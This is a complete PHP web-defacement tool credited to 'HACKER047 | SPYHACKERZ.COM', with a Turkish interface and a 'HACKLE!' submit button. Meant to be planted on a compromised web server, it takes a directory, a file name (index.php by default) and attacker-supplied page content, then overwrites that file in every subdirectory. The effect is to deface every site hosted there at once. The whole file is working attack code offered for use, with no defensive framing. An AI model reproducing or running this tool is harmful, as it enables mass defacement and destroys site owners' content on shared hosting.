<?php
 
/*
 
Mass Defacer
| HACKER047 |
 
*/
echo "<center><img src='http://i.hizliresim.com/y4rZ3M.gif'></center>";
echo "<br>";
echo "<br>";
echo "<br>";
echo "<title>SpyHackerz-MassDefacer</title>";
echo "<center>HACKER047 | SPYHACKERZ.COM</center><br>";
echo "<center>Abilerim: MecTruy | eL-CeWaD | TheWayEnd | ByBaFRaLi |</center>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='white'><font color='black'><font face='Electrolize'>";
echo "<center><form method='POST'></center>";
echo "<center>DIZIN: <input type='text' name='base_dir' size='40' value='".getcwd ()."'></center><br><br>";
echo "<center>DOSYA ADI : <input type='text' name='file_name' value='index.php'></center><br><br>";
echo "<center>INDEX : <br><textarea style='width: 685px; height: 250px;' name='index'>INDEX KODLARINI BURAYA YAPISTIR</textarea></center><br>";
echo "<center><input type='submit' value='HACKLE!'></form></center>";
 
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." BULUNAMADI !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." DIZIN DEGIL !<br>");
 
        @chdir ($_POST['base_dir']) or die ("DIZIN ACILAMADI");
 
        $files = @scandir ($_POST['base_dir']) or die ("TAMAMDIR<br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>TAMAMDIR!</span><br>";
                }
        endforeach;
}
 
?>